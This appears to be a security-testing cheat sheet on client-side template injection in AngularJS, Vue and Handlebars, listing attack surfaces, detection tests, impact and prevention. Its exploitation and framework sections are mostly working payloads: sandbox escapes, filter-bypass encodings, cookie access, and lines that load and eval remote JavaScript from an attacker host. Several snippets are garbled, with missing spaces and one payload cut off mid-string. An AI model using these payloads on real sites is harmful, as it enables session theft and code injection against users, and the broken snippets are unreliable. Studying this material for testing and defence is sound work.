---
title: Client Side Template Injection (CSTI)
---

# Client Side Template Injection (CSTI)

### Definition

CSTI occurs when user input is embedded into a client-side template (Angular, Vue, Moustache, Handlebars) without proper sanitization, allowing an attacker to execute expressions within the framework's context.

### Difference Between SSTI and CSTI

| Feature | SSTI | CSTI |
| --- | --- | --- |
| Execution | Server | Client (browser) |
| Severity | High (RCE possible) | Medium (XSS-like) |
| Detection | Harder | Easier |
| Languages | Python, PHP, Java | JavaScript |
| Impact scope | Full backend compromise | User/session level |
|  |  |  |

### **Attack Surfaces**

- **Reflected Input**
    - Search bars
    - Error messages
    - Welcome [user] headers.
- **URL Fragments**
    - Data pulled from **`window.location.has**h`.
- **XHR/API Responses**
    - JSON data fetched from an API that is rendered via a template.
- **Single Page Applications (SPAs)**
    - Routes and state parameters managed by the frontend framework.
- **Client-Side Storage**
    - **localStorage / sessionStorage**
        - Apps often load user data from storage and inject into templates
    - Example:
        
        ```
        constname=localStorage.getItem("username");
        element.innerHTML=`Hello {{${name} }}`;
        ```
        
- **Cookies**
    - Cookies read via `document.cookie` and rendered dynamically
    - Especially risky in legacy AngularJS apps
- **WebSocket Messages**
    - Real-time apps (chat, dashboards) render incoming messages into templates
    - Often overlooked in testing
- **PostMessage API**
    - Data received from iframes or other windows:
        
        ```
        window.addEventListener("message", (e) => {
        renderTemplate(e.data);
        });
        ```
        
- **Query Parameters (Deep Objects)**
    - Not just simple `?q=abc`
    - Also:
        
        ```
        ?user[name]=test&user[role]=admin
        ```
        
- **Third-Party Integrations**
    - Widgets, analytics, chat plugins
    - Sometimes pass user-controlled data into templates internally
- **DOM-Based Data Binding**
    - Framework bindings like:
        - Angular: `ng-bind`, `ng-bind-html`
        - Vue: `v-html`
- **HTML Attributes**
    - Injection into attributes interpreted by frameworks:
        
        ```
        <divng-init="user='INPUT'"></div>
        ```
        
- **Template Expressions in JS**
    - Dangerous dynamic template compilation:
        
        ```
        newFunction("return `"+user_input+"`")();
        ```
        
- **Markdown / WYSIWYG Editors**
    - User content rendered via template engines after parsing
    - Seen in:
        - Comments
        - Blogs
        - Notes apps
- **Client-Side Rendering of Logs / Debug Data**
    - Debug panels or logs rendered in UI
    - Example:
        
        ```
        logPanel.innerHTML=`{{ log_message }}`;
        ```
        
- **Prototype Pollution → CSTI Chain**
    - Pollute object → injected into template
    - Example:
        
        ```
        Object.prototype.payload="{{7*7}}";
        ```
        
- **Dynamic Routing Parameters (SPA Routers)**
    - Framework routers:
        - `/user/:name`
    - Injected into views without sanitization
- **Hidden Fields / Meta Tags**
    - Data stored in:
        
        ```
        <metaname="user"content="{{INPUT}}">
        ```
        
    - Later parsed and rendered

---

### **Exploitation**

The goal is to break out of the template expression and execute arbitrary JavaScript.

- **Basic Polyglot**

```jsx
{{ constructor.constructor('alert(1)')() }}
```

- **Encoding Bypasses**
    - **`String.fromCharCode`:** Using the payload if quotes are filtered
    
    ```jsx
    {{$on.constructor('alert(String.fromCharCode(88,83,83))')()}} 
    ```
    
    - **Hex/Unicode:** `\u007b\u007b` instead of `{{`.
- **Double Braces**
    - If `{{` is stripped, try `{{{` or `[[ ]]` (common in Vue/Handlebars).
- **White Space**
    - `{{ constructor.constructor( 'alert(1)' )() }}` to bypass regex filters.

---

### **Advanced Attack Scenarios**

- **Sandbox Escapes**
    - Targeting older versions of Angular (1.2 - 1.5) where a "sandbox" attempted to prevent access to the `window` object.
    - **Bypassing Expression Blacklists**
        - Older AngularJS sandboxes try to block keywords like `window`, `document`, `constructor`
        - Attackers bypass using alternate paths:
        
        ```
        {{[].filter.constructor('alert(1)')()}}
        ```
        
    - **Accessing the Global Object (`window`) Indirectly**
        - Even if `window` is blocked, it can be reached via prototype chains
            
            ```
            {{this.constructor.constructor('return window')().alert(1)}}
            ```
            
    - **Bypassing `$eval` Restrictions**
        - If `$eval` is filtered, use its constructor
        
        ```
        {{$eval.constructor('alert(1)')() }}
        ```
        
- **DOM-Based XSS via CSTI**
    - Using the template engine to write to dangerous sinks like `innerHTML`.
    - Example:
    
    ```jsx
    document.getElementById('asd').innerHTML = '<script>document.cookie</script>'
    ```
    
- **Cookie Stealing**
    - Accessing the document object via the constructor:
    
    ```jsx
    {{constructor.constructor('alert(document.cookie)')()}}
    ```
    

---

### **Framework Specific Scenarios**

#### **AngularJS (1.x)**

- Classic (1.5+)

```jsx
{{$on.constructor('alert(1)')()}}
```

- No Quotes

```jsx
{{$on.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}
```

- Dynamic Script Loader

```jsx
{{constructor.constructor("var s=document.createElement('script');s.src='https://attacker.com/payload.js';d
```

- Escapes sandbox
- Creates a `<script>` tag
- Loads **remote attacker-controlled JavaScript**

#### **Vue.js**

- **Standard**

```jsx
{{_setup.constructor('alert(1)')()}}
```

- **V-html abuse**
    - If a developer uses `v-html` with user input, it's a direct XSS, but CSTI can occur if the input is parsed by the Vue compiler.
- Runtime Template Compilation Abuse

```jsx
{{constructor.constructor("fetch('https://attacker.com/payload.js').then(r=>r.text()).then(eval)")()}}
```

- Fetches remote JS
- Executes it using `eval`
- Works in builds where runtime compilation is enabled

#### **Handlebars / Mustache**

- **Logic-less escape**

```jsx
{{this.constructor.constructor('alert(1)')()}}
```

- Function Constructor → Remote Execution Chain

```jsx
{{this.constructor.constructor("fetch('https://attacker.com').then(r=>r.text()).then(eval)")()}}
```

### **Detection Techniques**

#### **Manual Techniques**

- **Mathematical Expression**
    - Submit `{{7*7}}` or `${7*7}`. If the page renders `49`, the application may have an injection attack.
- **The "Syntax" Test**
    - Submit `{{<@$%}}`. If the framework throws a console error (viewable in DevTools), it confirms the parser is active.
- **Identifier Discovery**
    - Try `{{this}}` to see the current scope object.

### **Automated Techniques**

- **Burp Suite Professional**
    - The "DOM Invader" extension is top tier for finding CSTI.
- **Nuclei**
    
    ```jsx
    nuclei -u https://target.com -t /path/to/csti.yaml -fr
    ```
    

---

### **Impact**

- **Full Account Takeover**
    - Stealing session tokens/cookies.
- **Data Exfiltration**
    - Accessing sensitive data rendered in the DOM.
- **Phishing**
    - Injecting fake login forms into a legitimate domain.
- **Bypassing Content Security Policy**
    - CSTI often bypasses CSP because the "malicious" script is generated by a trusted, whitelisted framework library.

---

### **Prevention Techniques**

- **Server-Side Escaping**
    - Use a secure, server-side templating engine to neutralize characters like `{{` before they reach the client.
- **Content Security Policy**
    - Implement a strict CSP that disallows `unsafe-eval`.
- **Avoid Dynamic Compilation**
    - Don’t use `$compile` in Angular or `Vue.compile()` with user-supplied strings.
- **AOT Compilation**
    - Use **Ahead-of-Time (AOT)** compilation instead of Just-In-Time (JIT) to ensure templates are pre-compiled and static.

---

### **Tools**

- DOM Invader
- Tplmap

### **Good to Read**

- [https://hackerone.com/reports/1265344](https://hackerone.com/reports/1265344)
- [https://hackerone.com/reports/2234564](https://hackerone.com/reports/2234564)
- [https://hackerone.com/reports/250837](https://hackerone.com/reports/250837)
- [https://hackerone.com/reports/230234](https://hackerone.com/reports/230234)

---

### **References**

- [PortSwigger: Client-Side Template Injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection#:~:text=To detect CSTI%2C testers should,the math%2C it is vulnerable](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection#:~:text=To%20detect%20CSTI%2C%20testers%20should,the%20math%2C%20it%20is%20vulnerable).
- [https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/](https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/)
- [https://medium.com/@s_novoselov/ssti-csti-dont-waste-your-time-c6e9fbb20743](https://medium.com/@s_novoselov/ssti-csti-dont-waste-your-time-c6e9fbb20743)
- [https://javascript.plainenglish.io/client-side-template-injection-csti-e694e714ce55](https://javascript.plainenglish.io/client-side-template-injection-csti-e694e714ce55)
- [https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html](https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html)
- [https://medium.com/@sohailahmed0x0/client-side-template-injection-3df3ab6c57d9](https://medium.com/@sohailahmed0x0/client-side-template-injection-3df3ab6c57d9)
- [https://www.invicti.com/web-application-vulnerabilities/angularjs-client-side-template-injection](https://www.invicti.com/web-application-vulnerabilities/angularjs-client-side-template-injection)